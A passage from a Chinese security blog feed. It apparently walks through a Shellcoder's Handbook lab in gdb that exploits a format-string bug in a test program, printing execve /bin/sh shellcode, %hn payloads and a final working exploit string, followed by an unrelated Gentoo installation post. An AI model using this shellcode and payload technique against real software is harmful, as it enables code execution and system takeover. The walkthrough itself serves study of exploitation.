0x0804848a &lt;+79&gt;:	sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line">   0x0804848d &lt;+82&gt;:	push   %eax</span><br><span class="line">   0x0804848e &lt;+83&gt;:	call   0x8048300 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048493 &lt;+88&gt;:	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x08048496 &lt;+91&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0804849b &lt;+96&gt;:	lea    -0xc(%ebp),%esp</span><br><span class="line">   0x0804849e &lt;+99&gt;:	pop    %ecx</span><br><span class="line">   0x0804849f &lt;+100&gt;:	pop    %ebx</span><br><span class="line">   0x080484a0 &lt;+101&gt;:	pop    %edi</span><br><span class="line">   0x080484a1 &lt;+102&gt;:	pop    %ebp</span><br><span class="line">   0x080484a2 &lt;+103&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">   0x080484a5 &lt;+106&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<ul>
<li><p>然后在下面三处地址下断点，为什么呢？第一处为刚刚执行完strcpy函数，从此处观察栈空间中我们输入的数据是否都正常地拷贝进来了，因此exp(包括shellcode)中若是含有\0坏字符将导致测试失败。当然也有很多<code>高深的技巧</code>来避免坏字符…第二处为printf函数刚刚执行完，我们可以看到返回地址是否被成功修改我们想要的地址。第三处为main函数快要返回了，此时的esp刚好指向返回地址，我们也可以查看是否正确，并且单步执行看程序执行流是否被导向到shellcode。</p>
</li>
<li><p>随后我们随便输入一个字符试试。经过对反汇编代码的认真分析以及对execve系统调用的大致理解可以知道下面的0xbfffff0e0处为evil首地址，因为有0x41414141。在地址0xbffff18c处为main函数的返回地址，继续往上为argc,等于2,正确。在网上则为argv的首地址，我们可以根据它继续分析argv[1]的地址是可以找到的。可以稍微参考<a href="http://www.rutk1t0r.org/2016/12/30/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-0-11%E7%9A%84loader-execve/">这篇文章</a>中的截图参照分析。认真分析过反汇编代码可以知道esp进来的时候总需要16字节对齐，猜测这是gcc的需求，然后又重新把返回地址压栈一遍，因此根据这个特性我们可以在另外的调试场景中快速定位ret(表示main函数返回地址)。由于我们禁止了ASLR，因此每次这个ret值是固定的，在我的PC中测试为0xb7e1b637，我们就是要改写它，而它的地址为0xbffff18c。我们每次的exp长度如果不同，导致程序参数长度不同，会继续导致exec系统调用对参数处理后esp值不同，因此我们需要随机应变。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) run $<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff224) at fmt.c:12</span><br><span class="line">12		strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff0d0:	0xbffff0e0	0xbffff3d7	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0e0:	0x41414141	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff130:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff140:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff150:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff160:	0x00000002	0xbffff224	0xbffff230	0xbffff190</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff170:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff180:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff190:	0x00000002	0xbffff224	0xbffff230	0x00000000</span><br><span class="line">0xbffff1a0:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff1b0:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff1c0:	0x00000000	0xab847af5	0x970cb4e5	0x00000000</span><br><span class="line">0xbffff1d0:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1e0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1f0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff200:	0x0804843b	0x00000002	0xbffff224	0x080484b0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li>
<li><p>上述仅仅是从第一步开始的时候这样探测，因此如果我们大概知道了这个”套路”就应该上真家伙。注意观察run后面的参数。解释一下这个exp(exploit)。前面部分直到\x80均为shellcode,取自谷大神的。后续填充了三个\x90,在Intel里面为<code>nop</code>。不过在这里不会执行到，只要不为\0即可。接着的8个字节为ret的高16位和低16位，我们可以看到0xbffff0bc开始的8个字节<code>大致</code>为ret的地址。这不是随机的，这是经过精心构造的，由于地址不对，我将重新修正(0xbffff014C)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x3e\xf2\xff\xbf\x3c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x3e\xf2\xff\xbf\x3c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:12</span><br><span class="line">12		strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff0a0	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff23e	0xbffff23c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393836	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0xe29ac6ee	0xde1388fe	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li>
<li><p>这一次对了，仅仅修改两个字节即可。好了，现在我们需要修改的地址已经传递进来了，是时候将数据传进来的。此时可以看到我们要传递的数据应该为0xbfffff0a0,只要将此值覆盖ret，控制流程就会被劫持到这里执行shellcode，又由于栈空间是可以被执行的(编译选项,还可以利用指令<code>cat /proc/[pid]/maps</code>来看)。利用%hn的特性，我们仅仅需要写两次即可，而根据%hn的特性我们无奈地只能先写0xbfff再铺垫0xf0a0-0xbfff个字符继续写。当然在写0xbfff之前需要计算字符个数来填充，因此才有了后面的%49119x以及%12689x。根据这几个原理我们将继续修正这几个值来使得exp能够被触发。我们先来看printf执行之后的情况吧。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf2\xff\xbf\x4c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf2\xff\xbf\x4c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:12</span><br><span class="line">12		strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff0a0	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff24e	0xbffff24c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393836	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0x09129cd8	0x359bd2c8	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>键入c之后程序继续运行，断在了printf刚刚执行完毕的地方。我们观察ret处发现并没有被修改，因此重新计算，再次重新运行。(发现前面也计算错了，得将f2改为f1).</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Breakpoint 2, 0x08048493 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:13</span><br><span class="line">13		<span class="built_in">printf</span>( argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff3a1	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff24e	0xbffff24c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393836	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0x09129cd8	0x359bd2c8	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果最终的画面和这个差不多，那说明快要成功了。(注意下面的指令是我经过修正执行过后的，我仅仅是按上方向键来显示而已，并非又重新执行)可以清楚的看到ret值被修改成了shellcode的首地址。上面的exp中的%10$hn和%11$hn是从printf调用处开始数，第10个四字节和第11个四字节这两个地址printf将会以16位的方式写入之前输出的字符个数。(可以数数看)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Breakpoint 2, 0x08048493 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:13</span><br><span class="line">13		<span class="built_in">printf</span>( argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff3a1	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff14e	0xbffff14c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393434	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xbffff0a0</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0x7704a549	0x4b8deb59	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf1\xff\xbf\x4c\xf1\xff\xbf%49119x%10$hn%12449x%11$hn&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>键入c继续运行查看栈空间.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x080484a5 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:15</span><br><span class="line">15	&#125;</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff14c:	0xbffff0a0	0x00000002	0xbffff1e4	0xbffff1f0</span><br><span class="line">0xbffff15c:	0x00000000	0x00000000	0x00000000	0xb7fb5000</span><br><span class="line">0xbffff16c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fb5000</span><br><span class="line">0xbffff17c:	0xb7fb5000	0x00000000	0x7704a549	0x4b8deb59</span><br><span class="line">0xbffff18c:	0x00000000	0x00000000	0x00000000	0x00000002</span><br><span class="line">0xbffff19c:	0x08048340	0x00000000	0xb7feff10	0xb7fea780</span><br><span class="line">0xbffff1ac:	0xb7fff000	0x00000002	0x08048340	0x00000000</span><br><span class="line">0xbffff1bc:	0x08048361	0x0804843b	0x00000002	0xbffff1e4</span><br><span class="line">0xbffff1cc:	0x080484b0	0x08048510	0xb7fea780	0xbffff1dc</span><br><span class="line">0xbffff1dc:	0xb7fff918	0x00000002	0xbffff36e	0xbffff3a1</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>单步走,看指令可以执行确实运行在shellcode空间内了。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0xbffff0a0 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/20i <span class="variable">$eip</span></span><br><span class="line">=&gt; 0xbffff0a0:	xor    %ecx,%ecx</span><br><span class="line">   0xbffff0a2:	mul    %ecx</span><br><span class="line">   0xbffff0a4:	mov    <span class="variable">$0xb</span>,%al</span><br><span class="line">   0xbffff0a6:	push   %ecx</span><br><span class="line">   0xbffff0a7:	push   <span class="variable">$0x68732f2f</span></span><br><span class="line">   0xbffff0ac:	push   <span class="variable">$0x6e69622f</span></span><br><span class="line">   0xbffff0b1:	mov    %esp,%ebx</span><br><span class="line">   0xbffff0b3:	int    <span class="variable">$0x80</span></span><br><span class="line">   0xbffff0b5:	nop</span><br><span class="line">   0xbffff0b6:	nop</span><br><span class="line">   0xbffff0b7:	nop</span><br><span class="line">   0xbffff0b8:	dec    %esi</span><br><span class="line">   0xbffff0b9:	icebp  </span><br><span class="line">   0xbffff0ba:	(bad)  </span><br><span class="line">   0xbffff0bb:	mov    <span class="variable">$0xbffff14c</span>,%edi</span><br><span class="line">   0xbffff0c0:	and    <span class="variable">$0x31313934</span>,%eax</span><br><span class="line">   0xbffff0c5:	cmp    %edi,0x25(%eax)</span><br><span class="line">   0xbffff0c8:	xor    %esi,(%eax)</span><br><span class="line">   0xbffff0ca:	and    <span class="variable">$0x68</span>,%al</span><br><span class="line">   0xbffff0cc:	outsb  %ds:(%esi),(%dx)</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>

<ul>
<li>再次键入c由于没有断点了会火力全开。Got it!可以看到新的shell已经成功运行。并且回弹了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">process 30736 is executing new program: /bin/bash</span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">pgp@Rutk1t0r:ch04$ ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">28187 pts/13   00:00:00 bash</span><br><span class="line">30013 pts/13   00:00:01 gdb</span><br><span class="line">30736 pts/13   00:00:00 sh</span><br><span class="line">30988 pts/13   00:00:00 ps</span><br><span class="line">pgp@Rutk1t0r:ch04$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="直接运行呢"><a href="#直接运行呢" class="headerlink" title="直接运行呢?"></a>直接运行呢?</h1><ul>
<li>如果按照上述情况我们直接./fmt $(exp)即可获取shell。但是发现并不能，我还怀疑过是否是权限问题，用root之后发现栈指针又不一样又继续调整，gdb是可以但是直接运行还是不可以。因此才有了换成/bin/nc的shellcode的想法(因为怀疑回弹的shell和当前shell重复，但是输入exit后当前shell都退出了，说明没有子shell)。然后必然猜测shell直接执行可执行程序和用gdb调试可执行程序的esp必然不一样，导致exp注入失败。然后就想着用书上的知识去读栈空间的某些特定值，来修正偏移。首先我们观察栈空间中某些值是否和栈的值大致匹配，有可能是局部变量压入。我们可以先直接读出argc，根据上面测试的例程可以知道其偏移为48。为了esp不继续变化我将前面字符进行填充。观察到偏移量为39的地方貌似有一个跟具体栈空间相关的值，读出来，然后进行偏移修正。根据在调试的时候39偏移处的值与ret地址的差，然后在实际运行的时候读出来的值应该也是这个差值，因此来修正我们的exp。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ./fmt $<span class="string">&#x27;%48$x\n&#x27;</span></span><br><span class="line">2</span><br><span class="line">pgp@Rutk1t0r:ch04$ ./fmt  $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\xce\xfa\xff\xbf\xcc\xfa\xff\xbfAAAAAAAAAAAAAAAAAAAA%48$x\n&#x27;</span></span><br><span class="line">1����</span><br><span class="line">     Qh//shh/bin��̀�����������AAAAAAAAAAAAAAAAAAAA2</span><br><span class="line">pgp@Rutk1t0r:ch04$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ./fmt  $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\xce\xfa\xff\xbf\xcc\xfa\xff\xbfAAAAAAAAAAAAAAAAAAAA%39$x\n&#x27;</span></span><br><span class="line">1����</span><br><span class="line">     Qh//shh/bin��̀�����������AAAAAAAAAAAAAAAAAAAAbffff1a0</span><br><span class="line">pgp@Rutk1t0r:ch04$ </span><br></pre></td></tr></table></figure>




<ul>
<li>最终的exp为<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x9e\xf1\xff\xbf\x9c\xf1\xff\xbf%49119x%10$hn%12529x%11$hn&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>这是我用ssh登录时候的场景，如果直接在本地运行估计又不一样，因此还需要随机应变。<br><img src="/images/The_Shellcodes_Handbook_ch04_successful.png" alt="The_Shellcodes_Handbook_ch04_successful.png"></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>完成本次实验感觉是很艰难的，不同于简单的栈溢出漏洞，直接用字符覆盖高地址处的ret(函数的返回指针)即可控制eip。而printf类的格式化字符串漏洞需要精心构造地址值并反复修正。若想修复的话可以下载glibc源码将%$n等特性去掉重新编译后安装。这样可以加大利用难度，因此很多地方都建议不用printf类函数。各类语言也将类似功能的函数进行高度封装来提高安全性。本地实验的测试exp在<a href="https://github.com/embpgp/the_shellcoders_handbook/blob/master/code/ch04/test.txt">这里</a>。</p>
]]></content>
      <categories>
        <category>study</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>exploit</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>gentoo_install</title>
    <url>/embpgp.github.io/2017/08/04/gentoo-install/</url>
    <content><![CDATA[<p>参考资料:<br><a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/zh-cn">https://wiki.gentoo.org/wiki/Handbook:AMD64/zh-cn</a>等等搜索引擎能够解决的问题链接</p>
<blockquote>
<p>今年三月份的时候就着手准备，无奈时间一直不连续，到近期下决心装好桌面版本，遂今日成．</p>
</blockquote>
<span id="more"></span>
<hr>
<h1 id="gentoo是啥？"><a href="#gentoo是啥？" class="headerlink" title="gentoo是啥？"></a>gentoo是啥？</h1><p>  跟Arch差不多的可供闲着的人折腾的定制化版的GNU/Linux．滚动更新和源码安装等是其和其他普遍的发行版最大的区别．成功安装gentoo，最起码使得初学者对GNU/Linux操作系统的大体构成有一定了解．</p>
<h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>  我个人的情况是已经安装了个GNU/Linux了且boot选项移交给了其gurb管理器，同时我是安装在物理机上的，因此后续的安装bootloader部分我就可以跳过了．简单点说就是在rootfs没有问题的情况下只要把内核源码编译出来的镜像放在指定位置同时新增前者的grub内容选项即可．我为rootfs分配了大概35G的磁盘空间，为boot分配了100M,而swap可以借用前者的，由于没有为/usr和/home分区因此其内容均挂载在rootfs下，其影响就是容灾性降低了．具体分区可用fdisk等分区工具．</p>
<h1 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h1><p>  网络上建议下载minimal版本的，其跟live主要区别就是全部都是黑框框．而后下载stage3和portage.可以在<a href="http://mirrors.163.com/gentoo/releases/">这里</a>下载.portage得下载最新版的，便于后期处理．而后可以用dd或者其他烧录工具将iso镜像烧录到u盘中，将其他两个文件包直接放在rootfs里面即可(portage包是在stage3解压之后再解压到/usr目录)．</p>
<h1 id="配置gentoo"><a href="#配置gentoo" class="headerlink" title="配置gentoo"></a>配置gentoo</h1><p>根据wiki里面的handbook先配置好大部分，其中需要主要的是网卡驱动部分．现在shell里面键入<code>lspci -k</code>即可，如下所示:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">01:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8101/2/6E PCI Express Fast/Gigabit Ethernet controller (rev 05)</span><br><span class="line">	Subsystem: Dell RTL8101/2/6E PCI Express Fast/Gigabit Ethernet controller</span><br><span class="line">	Kernel driver <span class="keyword">in</span> use: r8169</span><br><span class="line">	Kernel modules: r8169</span><br><span class="line">02:00.0 Network controller: Broadcom Corporation BCM43142 802.11b/g/n (rev 01)</span><br><span class="line">	Subsystem: Dell Wireless 1704 802.11n + BT 4.0</span><br><span class="line">	Kernel driver <span class="keyword">in</span> use: wl</span><br><span class="line">	Kernel modules: bcma, wl</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p>根据下面的提示可以找到相应的网卡驱动，在<code>make menuconfig</code>之后直接键入<code>/</code>进行模块的搜索，例如<code>r8169</code>而后选中后即可将内核模块编译进来，同时需要注意网卡命名是否类似于<code>eth0</code>，如果不是则需要在网络配置的时候更改，例如<code>enp1s0</code>建立软链接，这样网络才能起来．其他部分也可以先让系统起来之后再去重新编译内核再加．如果没有挂载boot分区则需要手动将压缩后的内核镜像和符号表等复制到boot分区．我的grub.cfg新增的内容如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menuentry <span class="string">&#x27;Gentoo/Linux 4.9.34&#x27;</span>&#123;</span><br><span class="line">	insmod ext2</span><br><span class="line">	<span class="built_in">set</span> root=<span class="string">&#x27;hd0,msdos10&#x27;</span></span><br><span class="line">	linux /vmlinuz-4.9.34-gentoo root=/dev/sda16</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>其中<code>set root=</code>部分是boot所在的分区，我这里是sda10.<code>linux ...</code>里面的vmlinuz-4.9.34-gentoo是内核镜像名称，其文件就在sda10分区．而root=后面的内容则是rootfs所在分区．而后exit处chroot环境，reboot准备进入物理环境了．</p>
